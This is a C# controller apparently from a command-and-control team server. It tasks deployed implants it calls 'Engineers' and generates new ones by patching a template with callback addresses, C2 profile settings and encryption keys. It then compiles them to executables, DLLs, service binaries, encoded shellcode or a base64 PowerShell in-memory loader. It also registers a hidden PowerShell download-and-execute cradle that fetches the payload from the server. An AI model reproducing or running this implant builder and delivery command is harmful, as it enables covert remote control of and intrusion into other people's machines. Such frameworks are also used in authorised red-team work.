using ApiModels.Requests;
using Microsoft.AspNetCore.Mvc;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using TeamServer.Models;
using TeamServer.Services;
using System.Linq;
using TeamServer.Models.Extras;
using System.Threading;
using System.Runtime.InteropServices;
using TeamServer.Models.Managers;
using TeamServer.Utilities;
using Microsoft.AspNetCore.Authorization;

namespace TeamServer.Controllers
{
	[Authorize(Roles ="Operator,TeamLead")]
	[ApiController]
	[Route("[controller]")]
	public class EngineersController : ControllerBase
	{
		// class member variables 
		private readonly IEngineerService _Engineers;
        public static List<Engineer> engineerList = new();

        // Constructor
        public EngineersController(IEngineerService Engineers)  //done in constructor because it can use the depedency injection to grab that service info. 
		{
			_Engineers = Engineers;
		}
		
		// API methods and functions 
		[HttpGet(Name = "RetrieveAllEngineers")]
		public IActionResult GetEngineers()
		{
			var Engineers = _Engineers.GetEngineers();
			return Ok(Engineers);
		}

		[HttpGet("{EngineerId}", Name = "RetrieveEngineer")]
		public IActionResult GetEngineer(string EngineerId)
		{
			var Engineer = _Engineers.GetEngineer(EngineerId);
			if (Engineer is null)
			{ 
				return NotFound(); 
			}
			return Ok(Engineer);
		}

		[HttpGet("{EngineerId}/tasks/{taskId}", Name = "RetrieveEngineerTaskResults")]
		public IActionResult GetTaskResult(string EngineerId, string taskId)
		{
			var engineer = _Engineers.GetEngineer(EngineerId);
			if (engineer is null)
			{
				return NotFound("Engineer not found");
			}
			else
			{
				var result = engineer.GetTaskResult(taskId);
				if (result is null)
				{
					return NotFound(result);
				}
				return Ok(result);
			}
        }

		[HttpGet("{EngineerId}/tasks", Name = "RetrieveAllEngineerTasks")]
		public IActionResult GetTaskResults(string EngineerId)
		{
			var Engineer = _Engineers.GetEngineer(EngineerId);
			if (Engineer is null) return NotFound("Engineer not found");

			var results = Engineer.GetTaskResults();
			return Ok(results);
		}

		[HttpPost("{EngineerId}", Name = "TaskEngineer")]
		public IActionResult TaskEngineer(string engineerId, [FromBody] TaskEngineerRequest request)
		{
			var engineer = _Engineers.GetEngineer(engineerId);
			if (engineer is null) return NotFound();

			var task = new EngineerTask(request.taskID,request.Command,request.Arguments,request.File, request.IsBlocking);

			if (engineer.QueueTask(task))
			{
				var root = $"{HttpContext.Request.Scheme}://{HttpContext.Request.Host}{HttpContext.Request.Path}";
				var path = $"{root}/tasks/{task.Id}";
                //if task.Arguments is not null, turn the dictionary into a string like /key1 value1 /key2 value2 etc
                var args = task.Arguments is null ? "" : string.Join(" ", task.Arguments.Select(kvp => $"{kvp.Key} {kvp.Value}"));
                EngineerTask taskHeader = new EngineerTask()
                {
                    Id = task.Id,
                    Command = $"({DateTime.UtcNow}) Engineer instructed to {task.Command + " " + args}\n",
                    Arguments = task.Arguments,
                };
                HardHatHub.StoreTaskHeader(taskHeader);
               // add the engineerId as the key with a new list of EngineerTask to the Engineer.Previous task Dictionary and add the task to the list of tasks for the engineer
                if (Engineer.previousTasks.ContainsKey(engineerId))
                {
                    Engineer.previousTasks[engineerId].Add(taskHeader);
                }
                else
                {
                    Engineer.previousTasks.Add(engineerId, new List<EngineerTask>() { taskHeader });
                }
                EngineerTask LoggingTask = new EngineerTask() { Id = task.Id, Command = task.Command, Arguments = task.Arguments, File = null, IsBlocking = task.IsBlocking };

                HardHatHub.UpdateOutgoingTaskDic(engineerId, taskHeader.Id, taskHeader.Command);
                HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"task {task.Command} {args} queued for execution", Status = "info" });
                LoggingService.TaskLogger.ForContext("Task", LoggingTask, true).ForContext("Engineer_Id",engineerId).Information($"task {taskHeader.Command} queued for execution");
                return Created(path, task);
			}
            return NotFound();
        }
        
		[HttpPost(Name = "CreateEngineer")]
		public IActionResult CreateEngineer([FromBody] SpawnEngineerRequest request)
		{
			char allPlatformPathSeperator = Path.DirectorySeparatorChar;
			// find the Engineer cs file and load it to a string so we can update it and then run the compiler function on it
			string path = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
			//split path at bin keyword
			string[] pathSplit = path.Split("bin"); //[0] is the parent folder [1] is the bin folder
            //update each string in the array to replace \\ with the correct path seperator
            pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
            pathSplit[1] = pathSplit[1].Replace("\\", allPlatformPathSeperator.ToString());

            string filePath = pathSplit[0] + $"..{allPlatformPathSeperator}Engineer" + $"{allPlatformPathSeperator}Program.cs";
            string file = System.IO.File.ReadAllText(filePath);

            //usinf request.managerName to find the correct manager object and then get its BindAddress and BindPort from the manager object
            //then using the BindAddress and BindPort to update the file
            string managerName = request.managerName;
			int connectionAttempts = request.ConnectionAttempts;
            int sleep = request.Sleep;
			SpawnEngineerRequest.SleepTypes sleepType = request.SleepType;
            string managerBindAddress = "";
            string managerBindPort = "";
            string managerConnectionAddress = "";
            string managerConnectionPort = "";
			string managerType = "";


            foreach (manager m in managerService._managers)
			{
                if (m.Type == manager.ManagerType.http || m.Type == manager.ManagerType.https)
				{
					Httpmanager manager = (Httpmanager)m;
                    if (manager.Name == managerName)
                    {
                        managerType = manager.Type.ToString();
                        managerConnectionAddress = manager.ConnectionAddress;
                        managerConnectionPort = manager.ConnectionPort.ToString();
                        file = file.Replace("{{REPLACE_MANAGER_NAME}}", managerName);
                        file = file.Replace("{{REPLACE_MANAGER_TYPE}}", managerType);
						if (manager.Type == Models.manager.ManagerType.http)
						{
                            file = file.Replace("{{REPLACE_ISSECURE_STATUS}}", "False");
                        }
						else if (manager.Type == Models.manager.ManagerType.https)
						{
							file = file.Replace("{{REPLACE_ISSECURE_STATUS}}", "True");
						}
                        //update some C2 Profile stuff 
                        file = file.Replace("{{REPLACE_URLS}}", manager.c2Profile.Urls);
                        file = file.Replace("{{REPLACE_COOKIES}}", manager.c2Profile.Cookies);
                        file = file.Replace("{{REPLACE_REQUEST_HEADERS}}", manager.c2Profile.RequestHeaders);
                        file = file.Replace("{{REPLACE_USERAGENT}}", manager.c2Profile.UserAgent);
                        //update file with ConnectionIP and ConnectionPort from request
                        file = file.Replace("{{REPLACE_CONNECTION_IP}}", managerConnectionAddress);
                        file = file.Replace("{{REPLACE_CONNECTION_PORT}}", managerConnectionPort);
                    }
                }
                else if(m.Type == manager.ManagerType.tcp)
				{
                    if (m.Name == managerName)
					{
						TCPManager manager = (TCPManager)m;
						//update file to update the BindPort, ListenPort, IsLocalHost Properties 
						file = file.Replace("{{REPLACE_MANAGER_NAME}}", managerName);
						file = file.Replace("{{REPLACE_MANAGER_TYPE}}", manager.Type.ToString());
						file = file.Replace("{{REPLACE_BIND_PORT}}", manager.BindPort.ToString());
						file = file.Replace("{{REPLACE_LISTEN_PORT}}", manager.ListenPort.ToString());
						file = file.Replace("{{REPLACE_ISLOCALHOSTONLY}}", manager.IsLocalHost.ToString());
						//update file with ConnectionIP and ConnectionPort from request
						file = file.Replace("{{REPLACE_CONNECTION_IP}}", managerBindAddress);
						file = file.Replace("{{REPLACE_CONNECTION_PORT}}", managerBindPort);
						if (manager.connectionMode == TCPManager.ConnectionMode.bind)
						{
							file = file.Replace("{{REPLACE_CHILD_IS_SERVER}}", "true");
						}
						else if (manager.connectionMode == TCPManager.ConnectionMode.reverse)
						{
							file = file.Replace("{{REPLACE_CHILD_IS_SERVER}}", "false");
                            managerBindAddress = manager.ConnectionAddress;
                        }
					}
                }
                else if (m.Type == manager.ManagerType.smb)
                {


                    if (m.Name == managerName)
                    {
                        SMBmanager manager = (SMBmanager)m;
                        //update file to update the BindPort, ListenPort, IsLocalHost Properties 
                        file = file.Replace("{{REPLACE_MANAGER_NAME}}", managerName);
                        file = file.Replace("{{REPLACE_MANAGER_TYPE}}", manager.Type.ToString());
						file = file.Replace("{{REPLACE_NAMED_PIPE}}", manager.NamedPipe);
						file = file.Replace("{{REPLACE_CONNECTION_IP}}", managerBindAddress);
						file = file.Replace("{{REPLACE_CONNECTION_PORT}}", managerBindAddress);
                        if (manager.connectionMode == SMBmanager.ConnectionMode.bind)
                        {
                            file = file.Replace("{{REPLACE_CHILD_IS_SERVER}}", "true");
                        }
                        else if (manager.connectionMode == SMBmanager.ConnectionMode.reverse)
                        {
                            file = file.Replace("{{REPLACE_CHILD_IS_SERVER}}", "false");
                            managerBindAddress = manager.ConnectionAddress;
                        }
                    }
                }
            }
            //update file with connection attempts 
            file = file.Replace("{{REPLACE_CONNECTION_ATTEMPTS}}", connectionAttempts.ToString());
            //update file with sleep time
            file = file.Replace("{{REPLACE_SLEEP_TIME}}", sleep.ToString());
			file = file.Replace("{{REPLACE_SLEEP_TYPE}}", sleepType.ToString());

			if (request.WorkingHours != null)
			{
				file = file.Replace("{{REPLACE_WORK_HOURS_START}}", request.WorkingHours.Split('-')[0]);
				file = file.Replace("{{REPLACE_WORK_HOURS_END}}", request.WorkingHours.Split('-')[1]);
			}
			if (request.WorkingHours != null)
			{
				Console.WriteLine($"working hours is {request.WorkingHours.Split('-')[0]} and {request.WorkingHours.Split('-')[1]}");
			}
            
			//update the two univerisal strings as well 
			file = file.Replace("{{REPLACE_MESSAGE_PATH_KEY}}", Encryption.UniversialMessagePathKey); // used on C2 messages 
            file = file.Replace("{{REPLACE_METADATA_KEY}}", Encryption.UniversialMetadataKey); // used on the metadata id header which is used to verify the implant is talking to the correct teamserver

            file = file.Replace("{{REPLACE_UNIQUE_TASK_KEY}}", Encryption.UniversalTaskEncryptionKey);


            //generate code for the implant
            byte[] assemblyBytes = Utilities.Compile.GenerateCode(file, request.complieType, request.SleepType);
            if (assemblyBytes is null)
			{
				return BadRequest("Failed to compile Engineer, check teamServer Console for errors.");
			}

            try
            {
	            //use ilMerge to merge the assembly and the protobuf dlls
	            GC.Collect();
	            GC.WaitForPendingFinalizers();

	            //if pathSplit[0]+temp does not exist then create it
	            if (!Directory.Exists(pathSplit[0] + "temp"))
	            {
		            Directory.CreateDirectory(pathSplit[0] + "temp");
	            }



	            string outputLocation = "";
	            string sourceAssemblyLocation = "";
	            if (request.complieType == SpawnEngineerRequest.EngCompileType.exe)
	            {
		            outputLocation = pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
		            sourceAssemblyLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
		            System.IO.File.WriteAllBytes(sourceAssemblyLocation, assemblyBytes);
	            }
	            else if (request.complieType == SpawnEngineerRequest.EngCompileType.dll)
	            {
		            outputLocation = pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.dll";
		            sourceAssemblyLocation =  pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.dll";
		            System.IO.File.WriteAllBytes(sourceAssemblyLocation, assemblyBytes);
	            }
	            else if (request.complieType == SpawnEngineerRequest.EngCompileType.serviceexe)
	            {
		            outputLocation = pathSplit[0] + ".." +$"{allPlatformPathSeperator}Engineer_{managerName}_service.exe";
		            sourceAssemblyLocation = pathSplit[0] + "temp" +$"{allPlatformPathSeperator}Engineer_{managerName}_service.exe";
		            System.IO.File.WriteAllBytes(sourceAssemblyLocation, assemblyBytes);
	            }
	            else
	            {
		            outputLocation = pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
		            sourceAssemblyLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
		            System.IO.File.WriteAllBytes(sourceAssemblyLocation, assemblyBytes);
	            }

	            
				var jsonFastLocation = pathSplit[0] + "Data" + $"{allPlatformPathSeperator}FastJSON.dll";
                var searchDir = $"{pathSplit[0]}Data{allPlatformPathSeperator}";

	            string[] assemblyArray = { sourceAssemblyLocation, jsonFastLocation};
	            Utilities.MergeAssembly.MergeAssemblies(outputLocation, assemblyArray, searchDir);


	            Console.WriteLine("Merged Engineer and needed dlls");
	            var updatedExe = System.IO.File.ReadAllBytes(outputLocation);
	            //if file exists for delete it so write all bytes can work
	            GC.Collect();
	            GC.WaitForPendingFinalizers();
	            //make a copy of the engineer in the temp folder to use for some commands later
	            System.IO.File.WriteAllBytes(sourceAssemblyLocation, updatedExe);
            }
            catch (Exception ex)
            {
	            Console.WriteLine(ex.Message);
	            Console.WriteLine(ex.StackTrace);
	            return BadRequest("Merging of exe and needed dlls failed, check teamServer Console for errors.");
            }

            if (request.complieType == SpawnEngineerRequest.EngCompileType.exe)
			{
				try
				{
					//if enviornment is windows then run confuse 
					if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
					{
						//Utilities.Compile.RunConfuser(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_merged.exe");
					}
                    string compiledEngLocation = $"{ pathSplit[0] }..{ allPlatformPathSeperator }Engineer_{ managerName }.exe";
                    HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"Engineer compiled saved at {compiledEngLocation}", Status = "success" });
                    LoggingService.EventLogger.Information("Compiled engineer saved at {compiledEngLocation}", compiledEngLocation);
                    Thread.Sleep(10);
                    return Ok("Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe");
				}
				catch (Exception ex)
				{
                    Console.WriteLine(ex.Message);
                    Console.WriteLine(ex.StackTrace);
                    return BadRequest("Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe already exists.");
				}
			}
            else if (request.complieType == SpawnEngineerRequest.EngCompileType.serviceexe)
            {
	            try
	            {
		            //if enviornment is windows then run confuse 
		            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
		            {
			            //Utilities.Compile.RunConfuser(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_merged.exe");
		            }
		            string compiledEngLocation = $"{ pathSplit[0] }..{ allPlatformPathSeperator }Engineer_{ managerName }_Service.exe";
		            HardHatHub.AlertEventHistory(new HistoryEvent { Event = $" Service engineer compiled saved at {compiledEngLocation}", Status = "success" });
		            LoggingService.EventLogger.Information("Compiled engineer saved at {compiledEngLocation}", compiledEngLocation);
		            Thread.Sleep(10);
		            return Ok("Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_Service.exe");
	            }
	            catch (Exception ex)
	            {
		            Console.WriteLine(ex.Message);
		            Console.WriteLine(ex.StackTrace);
		            return BadRequest("Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_Service.exe already exists.");
	            }
            }
            else if (request.complieType == SpawnEngineerRequest.EngCompileType.dll)
            {
	            try
	            {
		            //if enviornment is windows then run confuse 
		            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
		            {
			            //Utilities.Compile.RunConfuser(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_merged.exe");
		            }
		            string compiledEngLocation = $"{ pathSplit[0] }..{ allPlatformPathSeperator }Engineer_{ managerName }.dll";
		            HardHatHub.AlertEventHistory(new HistoryEvent { Event = $" Service engineer compiled saved at {compiledEngLocation}", Status = "success" });
		            LoggingService.EventLogger.Information("Compiled engineer saved at {compiledEngLocation}", compiledEngLocation);
		            Thread.Sleep(10);
		            return Ok("Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.dll");
	            }
	            catch (Exception ex)
	            {
		            Console.WriteLine(ex.Message);
		            Console.WriteLine(ex.StackTrace);
		            return BadRequest("Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.dll already exists.");
	            }
            }
			else if (request.complieType == SpawnEngineerRequest.EngCompileType.shellcode)
			{
				try
				{
                    //call the shellcode utility giving it the path we just wrote this exe to then return the shellcode and write its content to a file 
                    var shellcodeLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
                    var shellcode = Utilities.Shellcode.AssemToShellcode(shellcodeLocation, "");
                    if (request.EncodeShellcode)
                    {
	                    var encoded_shellcode = Shellcode.EncodeShellcode(shellcode);
	                    System.IO.File.WriteAllBytes(
		                    pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_shellcode.bin",
		                    encoded_shellcode);
                    }
					else
					{
	                    System.IO.File.WriteAllBytes(
		                    pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_shellcode.bin",
		                    shellcode);
					}

                    //Utilities.Compile.RunConfuser(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe");
                    string shellLocation = $"{pathSplit[0]}..{allPlatformPathSeperator }Engineer_{managerName}_shellcode.bin";
                    HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"Engineer shellcode written to {shellLocation}", Status = "success" });
                    LoggingService.EventLogger.Information("Engineer shellcode written to {shellLocation}", shellLocation);

                    return Ok("Shellcode file written to " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_shellcode.bin");
				}
				catch (Exception ex)
				{
                    Console.WriteLine(ex.Message);
                    Console.WriteLine(ex.StackTrace);
                    return BadRequest("Engineer shellcode " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.bin already exists.");
				}
			}
            //if request.compileType is powershellcmd then convert the assemnbly bytes to a base64 string 
            else if (request.complieType == SpawnEngineerRequest.EngCompileType.powershellcmd)
            {
                try
                {
                    byte[] Mergedengineer = System.IO.File.ReadAllBytes(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe");
                    string binaryb64 = Convert.ToBase64String(Mergedengineer);
					string powershellCommand = $"$a=[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(\"{binaryb64}\"));$a.EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null";
                    //write the powershell command to a text file 
                    System.IO.File.WriteAllText(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt", powershellCommand);
					System.IO.File.WriteAllText(pathSplit[0] + "wwwroot" + $"{allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt", powershellCommand);
                    string psCommandPath = pathSplit[0] + "wwwroot" + $"{allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt";

                    HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"Engineer powershell command written to {allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt", Status = "success" });
                    LoggingService.EventLogger.Information("Engineer powershell command written to {psCommandPath}",psCommandPath);
                    HardHatHub.AddPsCommand($"powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('https://TeamserverIp:HttpManagerPort/Engineer_{managerName}_pscmd.txt'))\"");
                    return Ok("Powershell command written to " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt");
                }
                catch (Exception ex )
                {
                    Console.WriteLine(ex.Message);
                    Console.WriteLine(ex.StackTrace);
                    return BadRequest("powershell cmd generation failed");
                }
            }
            return BadRequest("Failed to compile Engineer, check teamServer Console for errors.");

        }

	}
}
